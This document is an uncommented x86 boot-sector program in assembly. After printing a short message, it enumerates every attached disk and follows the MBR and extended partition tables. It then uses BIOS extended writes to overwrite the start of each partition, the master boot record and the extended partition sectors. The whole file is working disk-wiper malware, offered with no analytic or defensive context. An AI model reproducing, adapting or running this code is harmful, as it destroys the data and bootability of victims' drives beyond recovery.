DELETE_BLOCKS_COUNT equ 2048h
DELETE_BLOCKS_SIZE equ 1h

use16
org 7C00h

xor ax, ax
mov ds, ax
mov es, ax
mov ss, ax
mov sp, 7C00h

mov dx, 0
mov bp, dmsg
mov ax, 1301h
mov cx, [msgsize]
mov bx, 0Ah
int 10h

xor ax, ax
mov dl, 80h
push dx

LoopDisks: 
pop dx 
push dx 
mov [X_SEC], 0 
mov ah, 42h
mov si, dap
int 13h
jc NoMoreDisks

cmp word [7E00h + 1FEh], 0AA55h
jne NextDiskLoop

mov si, 7FBEh ; 7E00h + 1BEh

ReadPartition:
mov eax, dword [si + 08h]

cmp byte [si + 04h], 0h
je NextPartLoop 

cmp byte [si + 04h], 0Fh
je LoadExtLBA

cmp byte [si + 04h], 05h
je LoadExtLBA
jmp SkipLoadExtLBA

LoadExtLBA:

mov [ExtPTSector], eax
jmp NextPartLoop 

SkipLoadExtLBA: 
call ErasePartition

NextPartLoop: 
add si, 10h 
cmp si, 7FEEh
jna ReadPartition
call EraseSector

SMBRLoop:
cmp [ExtPTSector], 0 
jz SMBRLoopEnds 

push [ExtPTSector]
pop [X_SEC]

mov ah, 42h
mov si, dap
int 13h
call EraseSector
mov eax, dword [7FBEh + 08h]
add eax, [ExtPTSector]

call ErasePartition
mov eax, dword [7FBEh + 0Ch]
add eax, dword [7FBEh + 08h]
add [ExtPTSector], eax 

cmp dword [7FCEh + 04h], 0
jz SMBRLoopEnds

jmp SMBRLoop

SMBRLoopEnds:

NextDiskLoop:
pop dx
inc dl
push dx
jmp LoopDisks

NoMoreDisks: 

int 18h 

ErasePartition:

push si
push [X_SEC] 
mov [N_SEC], DELETE_BLOCKS_SIZE
mov [buf_off], 0h
mov [X_SEC], eax
mov cx, DELETE_BLOCKS_COUNT 

erase_next:
mov ax, 4300h
mov si, dap
int 13h 
add [X_SEC], DELETE_BLOCKS_SIZE 
loop erase_next

pop [X_SEC]
pop si
mov [buf_off], 7E00h
mov [N_SEC], 1

ret

EraseSector:

mov [buf_off], 0
mov si, dap
mov ax, 4300h
int 13h
mov [buf_off], 7E00h
ret

dap:
packet_size db 10h
reserved db 00h
N_SEC dw 01h 
buf_off dw 7E00h
buf_seg dw 00h
X_SEC dd 00h
dd 00h

ExtPTSector dd 00h

dparam:
dw 001Ah

dmsg db "!hZGFetch.2"
db "Hi"
msgsize dw $-dmsg
